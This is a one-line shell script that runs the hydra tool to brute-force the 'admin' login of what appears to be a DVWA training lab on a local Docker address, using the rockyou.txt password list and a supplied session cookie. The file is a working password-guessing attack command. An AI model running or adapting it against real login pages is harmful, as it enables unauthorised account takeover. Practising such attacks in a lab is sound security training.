#!/bin/sh

hydra -l admin -P rockyou.txt 172.17.0.2 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: PHPSESSID=$1; security=low" -V

